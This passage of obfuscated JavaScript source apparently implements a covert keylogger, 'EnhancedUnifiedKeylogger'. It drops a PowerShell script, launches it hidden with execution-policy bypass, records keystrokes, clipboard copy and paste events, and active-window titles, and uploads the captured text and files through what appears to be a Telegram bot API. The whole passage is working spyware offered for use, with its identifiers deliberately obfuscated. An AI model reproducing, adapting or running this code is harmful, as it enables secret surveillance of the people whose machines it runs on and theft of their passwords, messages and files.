20\x20\x20\x20\x20\x20\x20\x20\x20\x20Write-Output\x20\x22UNICODE:$unicodeCode\x22\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20}\x20elseif\x20($SpecialKeys.ContainsKey($vKey))\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20$specialKey\x20=\x20$SpecialKeys[$vKey]\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20Write-Output\x20\x22KEY:$specialKey\x22\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20}\x20else\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20$PreviousKeyStates[$vKey]\x20=\x20$false\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x20\x20\x20\x20}\x0a}\x20catch\x20{\x0a\x20\x20\x20\x20Write-Output\x20\x22ERROR:$($_.Exception.Message)\x22\x0a}\x0a';fs['writeFileSync'](_0x3db557,_0x3605a5,_0x4bf476(0x23a)),this['keyloggerProcess']=spawn(_0x4bf476(0x27c),[_0x4bf476(0x255),'Bypass','-WindowStyle','Hidden',_0x4bf476(0x1d5),'-File',_0x3db557],{'stdio':[_0x4bf476(0x1df),'pipe',_0x4bf476(0x27e)],'windowsHide':!![]}),this[_0x4bf476(0x207)]['stdout']['on']('data',_0x3247c2=>{const _0x44b818=_0x4bf476;this[_0x44b818(0x1ea)](_0x3247c2[_0x44b818(0x28d)]());}),this[_0x4bf476(0x207)][_0x4bf476(0x22d)]['on'](_0x4bf476(0x204),_0x41cacd=>{}),this[_0x4bf476(0x207)]['on']('error',_0x155a34=>{const _0x1588ee=_0x4bf476;this[_0x1588ee(0x229)](_0x1588ee(0x1d7)+_0x155a34[_0x1588ee(0x21f)],PRIORITY[_0x1588ee(0x251)]);}),this['psScriptPath']=_0x3db557;}[_0x2a73ee(0x1ea)](_0x5114c8){const _0x1ed66e=_0x2a73ee,_0x2e32f1=_0x5114c8[_0x1ed66e(0x291)]('\x0a')[_0x1ed66e(0x1db)](_0x507c9c=>_0x507c9c[_0x1ed66e(0x2ab)]());_0x2e32f1[_0x1ed66e(0x1e5)](_0x4b1ec6=>{const _0x3fed2e=_0x1ed66e,_0x2fb9d0=_0x4b1ec6[_0x3fed2e(0x2ab)]();if(_0x2fb9d0===_0x3fed2e(0x1f6)){}else{if(_0x2fb9d0==='COPY_DETECTED')this[_0x3fed2e(0x254)]();else{if(_0x2fb9d0===_0x3fed2e(0x21e))this[_0x3fed2e(0x296)]();else{if(_0x2fb9d0[_0x3fed2e(0x27a)](_0x3fed2e(0x263)))this['queueMessage']('❌\x20'+_0x2fb9d0[_0x3fed2e(0x240)](0x6),PRIORITY['URGENT']);else{if(_0x2fb9d0[_0x3fed2e(0x27a)](_0x3fed2e(0x26d))){const _0x35ec61=parseInt(_0x2fb9d0[_0x3fed2e(0x240)](0x8));if(!isNaN(_0x35ec61)){const _0x13954c=String[_0x3fed2e(0x231)](_0x35ec61);this[_0x3fed2e(0x25e)](_0x13954c,!![]);}}else{if(_0x2fb9d0[_0x3fed2e(0x27a)]('KEY:')){const _0x5c109e=_0x2fb9d0[_0x3fed2e(0x240)](0x4);this[_0x3fed2e(0x25e)](_0x5c109e,![]);}}}}}}});}[_0x2a73ee(0x254)](){const _0x3d9ea5=_0x2a73ee,_0x5af570=_0x3d9ea5(0x23f)+this['currentWindow'];this['queueMessage'](_0x5af570,PRIORITY['NORMAL']);}['handlePasteDetected'](){const _0x27b872=_0x2a73ee,_0x36ff2b=Date[_0x27b872(0x262)]();this[_0x27b872(0x222)]=_0x36ff2b;const _0x5244f5=this[_0x27b872(0x230)]['find'](_0x225fb7=>_0x36ff2b-_0x225fb7[_0x27b872(0x2a3)]<0xea60);if(_0x5244f5){const _0x3a5cbf=Math[_0x27b872(0x258)]((_0x36ff2b-_0x5244f5['timestamp'])/0x3e8),_0xcc7f34=this[_0x27b872(0x261)](_0x5244f5[_0x27b872(0x260)]),_0x9021a7=_0x27b872(0x1ec)+_0xcc7f34+'\x20'+_0x5244f5[_0x27b872(0x28f)]+'\x0a'+('🖼️\x20Into:\x20'+this['currentWindow']+'\x0a')+(_0x27b872(0x209)+_0x5244f5[_0x27b872(0x29f)]+'\x20('+_0x3a5cbf+_0x27b872(0x282));this[_0x27b872(0x229)](_0x9021a7,PRIORITY['URGENT']);}else{const _0xfd9da7='📥\x20PASTE\x20operation\x20detected\x0a🖼️\x20Into:\x20'+this[_0x27b872(0x298)];this[_0x27b872(0x229)](_0xfd9da7,PRIORITY[_0x27b872(0x242)]);}}[_0x2a73ee(0x25e)](_0x13669b,_0x23d818){const _0x4c276b=_0x2a73ee;_0x23d818&&this['detectLanguage'](_0x13669b),this[_0x4c276b(0x214)]['batchKeystrokes']&&this[_0x4c276b(0x284)](_0x13669b,_0x4c276b(0x20f));}['detectLanguage'](_0x2a35cb){const _0x4acf4b=_0x2a73ee;for(const [_0x54fb72,_0x186c0f]of Object[_0x4acf4b(0x20d)](LANGUAGE_PATTERNS)){if(_0x186c0f['test'](_0x2a35cb)){if(_0x54fb72!==this[_0x4acf4b(0x1e3)]){const _0x16375f=this['currentLanguage'];this['currentLanguage']=_0x54fb72,this[_0x4acf4b(0x1ef)](_0x54fb72,_0x16375f);}return;}}if(/[a-zA-Z0-9]/['test'](_0x2a35cb)&&this[_0x4acf4b(0x1e3)]!=='english'){const _0x2fdb61=this[_0x4acf4b(0x1e3)];this[_0x4acf4b(0x1e3)]=_0x4acf4b(0x206),this[_0x4acf4b(0x1ef)](_0x4acf4b(0x206),_0x2fdb61);}}[_0x2a73ee(0x1ef)](_0x9e7776,_0x29a217){const _0x32b4b9=_0x2a73ee,_0x15e7b9=this['getLanguageFlag'](_0x29a217),_0x5c9653=this[_0x32b4b9(0x261)](_0x9e7776),_0x54fe67={'hebrew':_0x32b4b9(0x213),'russian':_0x32b4b9(0x221),'arabic':_0x32b4b9(0x2a4),'chinese':_0x32b4b9(0x241),'japanese':_0x32b4b9(0x2a1),'korean':'Korean','greek':_0x32b4b9(0x279),'cyrillic':_0x32b4b9(0x202),'latin_extended':_0x32b4b9(0x26e),'english':_0x32b4b9(0x256)},_0x2f66d6=_0x32b4b9(0x211)+_0x15e7b9+'\x20'+(_0x54fe67[_0x29a217]||_0x29a217)+_0x32b4b9(0x24d)+_0x5c9653+'\x20'+(_0x54fe67[_0x9e7776]||_0x9e7776);this[_0x32b4b9(0x229)](_0x2f66d6,PRIORITY[_0x32b4b9(0x205)]);}['addToKeystrokeBatch'](_0x2eaa81,_0x44e165=_0x2a73ee(0x20f)){const _0x101b4d=_0x2a73ee,_0x4df0f5=[_0x101b4d(0x208),_0x101b4d(0x22e),_0x101b4d(0x244),_0x101b4d(0x281)];if(_0x4df0f5[_0x101b4d(0x270)](_0x2eaa81)){this[_0x101b4d(0x267)][_0x101b4d(0x25b)]>0x0&&this[_0x101b4d(0x1de)]();const _0x478271={'[BACKSPACE]':'⌫','[ENTER]':'↵','[ESC]':'⎋','[TAB]':'→'},_0x5a9dac=_0x478271[_0x2eaa81]||_0x2eaa81,_0x36c82d=_0x44e165===_0x101b4d(0x20f)?'⌨️':'📋';this[_0x101b4d(0x229)](_0x36c82d+'\x20'+_0x5a9dac+'\x0a🖼️\x20'+this['currentWindow'],PRIORITY[_0x101b4d(0x242)]);return;}this[_0x101b4d(0x267)]+=_0x2eaa81,this[_0x101b4d(0x267)][_0x101b4d(0x25b)]>=this[_0x101b4d(0x214)]['maxBatchSize']?this['sendKeystrokeBatch'](_0x44e165):this['resetBatchTimer'](_0x44e165);}[_0x2a73ee(0x268)](_0x20cfbf=_0x2a73ee(0x20f)){const _0x2c16dc=_0x2a73ee;if(this['batchTimer'])clearTimeout(this[_0x2c16dc(0x1fb)]);this[_0x2c16dc(0x1fb)]=setTimeout(()=>{const _0x2d1664=_0x2c16dc;this[_0x2d1664(0x267)]['length']>0x0&&this[_0x2d1664(0x1de)](_0x20cfbf);},this[_0x2c16dc(0x214)][_0x2c16dc(0x29c)]);}[_0x2a73ee(0x1de)](_0xa84c07=_0x2a73ee(0x20f)){const _0x2c39e9=_0x2a73ee;if(this[_0x2c39e9(0x267)]['length']===0x0)return;const _0x39e26e=this[_0x2c39e9(0x1ff)](this[_0x2c39e9(0x267)]),_0x33d2f5=this[_0x2c39e9(0x261)](_0x39e26e),_0x2d8014=_0xa84c07==='TYPED'?'⌨️':'📋',_0x9e4255=_0xa84c07===_0x2c39e9(0x20f)?'TYPED':_0x2c39e9(0x1f1),_0x539409=_0x2d8014+'\x20'+_0x9e4255+':\x20'+_0x33d2f5+'\x20'+this[_0x2c39e9(0x267)]+_0x2c39e9(0x23c)+this[_0x2c39e9(0x298)];this[_0x2c39e9(0x229)](_0x539409,PRIORITY[_0x2c39e9(0x242)]),this[_0x2c39e9(0x267)]='',this['batchTimer']&&(clearTimeout(this[_0x2c39e9(0x1fb)]),this['batchTimer']=null);}async[_0x2a73ee(0x201)](_0x57f512){return new Promise((_0x34932b,_0x17cd03)=>{const _0x38d415=_0x13cb,_0x56b8e8=_0x38d415(0x294)+this['config'][_0x38d415(0x2ac)]+'/sendMessage',_0x55045d=JSON[_0x38d415(0x2a7)]({'chat_id':this[_0x38d415(0x214)][_0x38d415(0x223)],'text':_0x57f512}),_0x517a1a={'method':_0x38d415(0x203),'headers':{'Content-Type':_0x38d415(0x1f9),'Content-Length':Buffer['byteLength'](_0x55045d)},'timeout':0x7530},_0x5f2228=https['request'](_0x56b8e8,_0x517a1a,_0x5bee67=>{const _0x5b6fb5=_0x38d415;let _0x439f2d='';_0x5bee67['on']('data',_0x38f3ca=>_0x439f2d+=_0x38f3ca),_0x5bee67['on'](_0x5b6fb5(0x275),()=>{_0x5bee67['statusCode']===0xc8?_0x34932b(_0x439f2d):_0x17cd03(new Error('HTTP\x20'+_0x5bee67['statusCode']+':\x20'+_0x439f2d));});});_0x5f2228['on']('error',_0x17cd03),_0x5f2228['on'](_0x38d415(0x1fc),()=>{const _0xb25567=_0x38d415;_0x5f2228[_0xb25567(0x265)](),_0x17cd03(new Error(_0xb25567(0x1d4)));}),_0x5f2228[_0x38d415(0x227)](_0x55045d),_0x5f2228[_0x38d415(0x275)]();});}async[_0x2a73ee(0x1e1)](_0x30bd74,_0x3cbb18){return new Promise((_0x38933e,_0x15027a)=>{const _0x18cf3c=_0x13cb,_0x3e2545=_0x18cf3c(0x294)+this[_0x18cf3c(0x214)][_0x18cf3c(0x2ac)]+'/sendDocument',_0x9d4722='----boundary'+Math[_0x18cf3c(0x216)]()['toString'](0x24),_0x13416b=fs[_0x18cf3c(0x286)](_0x30bd74),_0x539e64=path[_0x18cf3c(0x28a)](_0x30bd74);let _0x1de73e='';_0x1de73e+='--'+_0x9d4722+'\x0d\x0a',_0x1de73e+=_0x18cf3c(0x224),_0x1de73e+=this[_0x18cf3c(0x214)][_0x18cf3c(0x223)]+'\x0d\x0a',_0x1de73e+='--'+_0x9d4722+'\x0d\x0a',_0x1de73e+=_0x18cf3c(0x24e),_0x1de73e+=_0x3cbb18+'\x0d\x0a',_0x1de73e+='--'+_0x9d4722+'\x0d\x0a',_0x1de73e+=_0x18cf3c(0x245)+_0x539e64+_0x18cf3c(0x225),_0x1de73e+=_0x18cf3c(0x25d);const _0x264794=Buffer[_0x18cf3c(0x1e0)]([Buffer[_0x18cf3c(0x285)](_0x1de73e,_0x18cf3c(0x23a)),_0x13416b,Buffer[_0x18cf3c(0x285)](_0x18cf3c(0x215)+_0x9d4722+_0x18cf3c(0x23d),_0x18cf3c(0x23a))]),_0x94a960={'method':_0x18cf3c(0x203),'headers':{'Content-Type':_0x18cf3c(0x1f3)+_0x9d4722,'Content-Length':_0x264794[_0x18cf3c(0x25b)]},'timeout':0xea60},_0x18c00e=https[_0x18cf3c(0x235)](_0x3e2545,_0x94a960,_0x24d663=>{const _0x558313=_0x18cf3c;let _0x45f22d='';_0x24d663['on'](_0x558313(0x204),_0x386565=>_0x45f22d+=_0x386565),_0x24d663['on'](_0x558313(0x275),()=>{const _0xc5675f=_0x558313;_0x24d663[_0xc5675f(0x29b)]===0xc8?_0x38933e(_0x45f22d):_0x15027a(new Error(_0xc5675f(0x1e4)+_0x24d663['statusCode']+':\x20'+_0x45f22d));});});_0x18c00e['on']('error',_0x15027a),_0x18c00e['on'](_0x18cf3c(0x1fc),()=>{const _0x57b5b3=_0x18cf3c;_0x18c00e[_0x57b5b3(0x265)](),_0x15027a(new Error(_0x57b5b3(0x1f4)));}),_0x18c00e[_0x18cf3c(0x227)](_0x264794),_0x18c00e[_0x18cf3c(0x275)]();});}async['start'](){const _0x20fc95=_0x2a73ee;if(this['isRunning']){console[_0x20fc95(0x297)](_0x20fc95(0x2a9));return;}this[_0x20fc95(0x271)]=!![];try{const _0x1734bd=_0x20fc95(0x1d6)+'⌨️\x20Keystrokes\x0a'+_0x20fc95(0x1ee)+('🖼️\x20OS:\x20'+(activeWin?'Windows':'PowerShell')+'\x0a');this[_0x20fc95(0x229)](_0x1734bd,PRIORITY['URGENT']),this[_0x20fc95(0x298)]=await this[_0x20fc95(0x23e)](),this[_0x20fc95(0x298)]!==_0x20fc95(0x22f)&&this[_0x20fc95(0x229)](_0x20fc95(0x295)+this[_0x20fc95(0x298)],PRIORITY['NORMAL']),await this[_0x20fc95(0x243)](),this[_0x20fc95(0x1d8)](),this['startWindowMonitoring']();}catch(_0x1c0cb2){console['log'](_0x20fc95(0x218)+_0x1c0cb2[_0x20fc95(0x21f)]),this['queueMessage']('❌\x20Start\x20error:\x20'+_0x1c0cb2['message'],PRIORITY[_0x20fc95(0x251)]),this[_0x20fc95(0x271)]=![];}}[_0x2a73ee(0x21c)](){const _0xe88067=_0x2a73ee;if(!this[_0xe88067(0x271)])return;console[_0xe88067(0x297)](_0xe88067(0x200)),this[_0xe88067(0x271)]=![];this[_0xe88067(0x267)][_0xe88067(0x25b)]>0x0&&this[_0xe88067(0x1de)]();if(this['batchTimer'])clearTimeout(this['batchTimer']);if(this['clipboardTimer'])clearInterval(this[_0xe88067(0x210)]);if(this[_0xe88067(0x1e9)])clearInterval(this[_0xe88067(0x1e9)]);if(this[_0xe88067(0x293)])clearInterval(this[_0xe88067(0x293)]);this[_0xe88067(0x207)]&&(this[_0xe88067(0x207)][_0xe88067(0x1dd)](),this[_0xe88067(0x207)]=null);if(this[_0xe88067(0x25f)]&&fs[_0xe88067(0x287)](this[_0xe88067(0x25f)]))try{fs[_0xe88067(0x252)](this[_0xe88067(0x25f)]);}catch(_0xc12114){}this[_0xe88067(0x229)](_0xe88067(0x246),PRIORITY[_0xe88067(0x251)]),console['log']('✅\x20Stopped\x20successfully');}[_0x2a73ee(0x24b)](){const _0x48e912=_0x2a73ee;this[_0x48e912(0x21c)]();}}function _0x13cb(_0x46cd0c,_0x585e26){const _0x112b2e=_0x112b();return _0x13cb=function(_0x13cb4b,_0x31ae56){_0x13cb4b=_0x13cb4b-0x1d3;let _0x215cc1=_0x112b2e[_0x13cb4b];return _0x215cc1;},_0x13cb(_0x46cd0c,_0x585e26);}function createEnhancedMonitor(_0x3110fd={}){return new EnhancedUnifiedKeylogger(_0x3110fd);}async function startEnhancedMonitor(_0x4958a5={}){const _0x47aacb=_0x2a73ee,_0x15efb7=createEnhancedMonitor(_0x4958a5);return await _0x15efb7[_0x47aacb(0x239)](),_0x15efb7;}module[_0x2a73ee(0x26f)]={'EnhancedUnifiedKeylogger':EnhancedUnifiedKeylogger,'createEnhancedMonitor':createEnhancedMonitor,'startEnhancedMonitor':startEnhancedMonitor};if(require[_0x2a73ee(0x1e2)]===module){const testMode=process[_0x2a73ee(0x1dc)][0x2]==='test';console[_0x2a73ee(0x297)](_0x2a73ee(0x2a5)),console[_0x2a73ee(0x297)](_0x2a73ee(0x27d)),startEnhancedMonitor()[_0x2a73ee(0x274)](_0x37e654=>{const _0x2969f1=_0x2a73ee;console[_0x2969f1(0x27f)]('❌\x20Error:',_0x37e654[_0x2969f1(0x21f)]),process[_0x2969f1(0x29d)](0x1);});}
